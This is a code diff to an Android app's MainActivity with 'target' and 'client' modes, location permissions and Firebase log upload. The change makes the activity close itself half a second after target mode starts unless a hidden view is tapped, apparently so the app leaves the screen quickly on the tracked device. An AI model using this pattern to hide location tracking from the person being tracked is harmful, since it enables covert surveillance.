@@ -5,8 +5,11 @@ import android.content.Intent
 import android.content.pm.PackageManager
 import android.os.Build
 import android.os.Bundle
+import android.os.Handler
+import android.os.Looper
 import android.view.Menu
 import android.view.MenuItem
+import android.view.View
 import android.widget.Button
 import android.widget.TextView
 import android.widget.Toast
@@ -31,8 +34,9 @@ class MainActivity : AppCompatActivity() {
     companion object {
         private const val TAG = "MainActivity"
     }
-    
+
     private lateinit var modePreferences: ModePreferences
+    private var shouldCloseAsap = false
 
     private val locationPermissionLauncher = registerForActivityResult(
         ActivityResultContracts.RequestMultiplePermissions()
@@ -56,14 +60,17 @@ class MainActivity : AppCompatActivity() {
     }
     private lateinit var tvModeStatus: TextView
     private lateinit var btnShowAsList: Button
+    private lateinit var viewStarter: View
 
     override fun onCreate(savedInstanceState: Bundle?) {
         Logger.initialize(this)
         Logger.log("\n\n\n$TAG: onCreate() called")
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_main)
+        supportActionBar?.setDisplayShowTitleEnabled(false);
         tvModeStatus = findViewById(R.id.tv_mode_status)
         btnShowAsList = findViewById(R.id.btn_show_as_list)
+        viewStarter = findViewById(R.id.view_starter)
 
         modePreferences = ModePreferences(this)
         val modeSet = modePreferences.isModeSet()
@@ -93,20 +100,20 @@ class MainActivity : AppCompatActivity() {
                 showModeSelectionDialog()
                 true
             }
-            
+
             R.id.action_view_logs -> {
                 Logger.log("$TAG: View logs option selected")
                 val intent = Intent(this, LogsActivity::class.java)
                 startActivity(intent)
                 true
             }
-            
+
             R.id.action_send_logs -> {
                 Logger.log("$TAG: Send logs option selected")
                 sendLogsToFirebase()
                 true
             }
-            
+
             R.id.action_get_logs -> {
                 Logger.log("$TAG: Get logs option selected")
                 val intent = Intent(this, FirebaseLogsActivity::class.java)
@@ -172,8 +179,15 @@ class MainActivity : AppCompatActivity() {
         when (currentMode) {
             AppMode.TARGET -> {
                 Logger.log("$TAG: Target mode selected, checking permissions")
+                shouldCloseAsap = true
                 if (checkPermissions()) {
+                    viewStarter.setOnClickListener {
+                        shouldCloseAsap = false
+                    }
                     startTargetMode()
+                    Handler(Looper.getMainLooper()).postDelayed({
+                        if (shouldCloseAsap) finish()
+                    }, 500)
                 }
             }
 
@@ -181,6 +195,7 @@ class MainActivity : AppCompatActivity() {
                 Logger.log("$TAG: Client mode selected")
                 startClientMode()
             }
+
             null -> {
                 Logger.log("$TAG: No mode selected, showing dialog")
                 showModeSelectionDialog()
@@ -233,19 +248,24 @@ class MainActivity : AppCompatActivity() {
 
     private fun sendLogsToFirebase() {
         Logger.log("$TAG: sendLogsToFirebase() called")
-        
+
         // Show loading toast
         Toast.makeText(this, getString(R.string.sending_logs), Toast.LENGTH_SHORT).show()
-        
+
         val firebaseHelper = FirebaseHelper()
         firebaseHelper.loadLogsToFirebase { success ->
             runOnUiThread {
                 if (success) {
                     Logger.log("$TAG: Logs sent to Firebase successfully")
-                    Toast.makeText(this, getString(R.string.logs_sent_successfully), Toast.LENGTH_LONG).show()
+                    Toast.makeText(
+                        this,
+                        getString(R.string.logs_sent_successfully),
+                        Toast.LENGTH_LONG
+                    ).show()
                 } else {
                     Logger.log("$TAG: Failed to send logs to Firebase")
-                    Toast.makeText(this, getString(R.string.logs_send_failed), Toast.LENGTH_LONG).show()
+                    Toast.makeText(this, getString(R.string.logs_send_failed), Toast.LENGTH_LONG)
+                        .show()
                 }
             }
         }
